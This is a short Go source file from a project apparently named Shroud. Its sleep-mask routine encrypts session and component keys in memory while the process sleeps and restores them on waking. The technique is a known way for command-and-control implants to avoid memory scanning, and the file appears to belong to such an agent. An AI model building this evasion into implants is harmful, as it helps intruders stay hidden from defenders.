package process

import (
	"crypto/rand"
	"io"
	"time"

	"Shroud/crypto"
	"Shroud/global"
)

type sleepState struct {
	ephemeralKey []byte
	encLinkKey   []byte
	encCryptoKey []byte
}

var currentSleep *sleepState

func SleepMask(duration time.Duration) {
	mask()
	time.Sleep(duration)
	unmask()
}

func mask() {
	ek := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, ek); err != nil {
		return
	}

	st := &sleepState{ephemeralKey: ek}

	if global.Session != nil && len(global.Session.LinkKey) > 0 {
		enc, err := crypto.AESEncrypt(global.Session.LinkKey, ek)
		if err == nil {
			st.encLinkKey = enc
			crypto.Wipe(global.Session.LinkKey)
		}
	}
	if global.G_Component != nil && len(global.G_Component.CryptoKey) > 0 {
		enc, err := crypto.AESEncrypt(global.G_Component.CryptoKey, ek)
		if err == nil {
			st.encCryptoKey = enc
			crypto.Wipe(global.G_Component.CryptoKey)
		}
	}

	currentSleep = st
}

func unmask() {
	st := currentSleep
	if st == nil {
		return
	}
	currentSleep = nil

	if len(st.encLinkKey) > 0 && global.Session != nil {
		dec, err := crypto.AESDecrypt(st.encLinkKey, st.ephemeralKey)
		if err == nil {
			copy(global.Session.LinkKey, dec)
		}
	}
	if len(st.encCryptoKey) > 0 && global.G_Component != nil {
		dec, err := crypto.AESDecrypt(st.encCryptoKey, st.ephemeralKey)
		if err == nil {
			copy(global.G_Component.CryptoKey, dec)
		}
	}

	crypto.Wipe(st.ephemeralKey)
}
